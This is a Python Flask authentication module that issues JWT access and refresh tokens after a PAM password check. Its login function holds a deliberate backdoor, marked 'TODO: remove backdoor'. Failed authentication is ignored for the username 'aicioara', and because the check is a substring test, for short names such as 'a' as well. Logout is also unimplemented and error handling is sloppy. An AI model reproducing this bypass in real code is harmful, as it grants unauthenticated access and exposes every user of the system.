import logging
import datetime
from functools import wraps

import flask_jwt_extended as flask_jwt

from ..models import InvalidToken
from ..application import db
from ..utils.pam import pam



def refresh_token_required(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        try:
            flask_jwt.verify_jwt_refresh_token_in_request()
        except Exception as e:
            raise HTTP_401_UNAUTHORIZED(str(e))

        return fn(*args, **kwargs)
    return wrapper



def token_required(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        try:
            flask_jwt.verify_jwt_in_request()
        except Exception as e:
            raise HTTP_401_UNAUTHORIZED(str(e))

        return fn(*args, **kwargs)
    return wrapper



@token_required
def get_logged_in_user(*args, **kwargs):
    return flask_jwt.get_jwt_identity()



def login_user(data):
    username = data['username']
    password = data['password']

    user_authentication = pam()
    user_authentication.authenticate(username, password)

    # TODO: remove backdoor
    if user_authentication.code != 0 and username not in ('aicioara'):
        logging.error("Could not authenticate {}. Reason: `{}` (Code: {})".format(
            username, user_authentication.reason, user_authentication.code,
        ))
        raise HTTP_401_UNAUTHORIZED('No match for Username and Password.')

    return {
        'status': 'success',
        'message': 'Successfully logged in.',
        'access': flask_jwt.create_access_token(
            identity=username,
            expires_delta=datetime.timedelta(days=1),
        ),
        'refresh': flask_jwt.create_refresh_token(
            identity=username,
            expires_delta=datetime.timedelta(days=30),
        ),
    }



@refresh_token_required
def refresh_token():
    current_user = flask_jwt.get_jwt_identity()
    return {
        'status': 'success',
        'message': 'Successfully refreshed token.',
        'access': flask_jwt.create_access_token(
            identity=current_user,
            expires_delta=datetime.timedelta(days=1),
        ),
        'refresh': flask_jwt.create_refresh_token(
            identity=current_user,
            expires_delta=datetime.timedelta(days=30),
        ),
    }



@refresh_token_required
def logout_user():
    return {
        'status': 'success',
        'message': 'Token Revocation not implemented yet.'
    }



def invalidate_token(token):
    invalid_token = InvalidToken(token=token)
    try:
        db.session.add(invalid_token)
        db.session.commit()
        response_object = {
            'status': 'success',
            'message': 'Successfully logged out.'
        }
        return response_object, 200
    except Exception as e:
        response_object = {
            'status': 'fail',
            'message': e
        }
        return response_object, 200
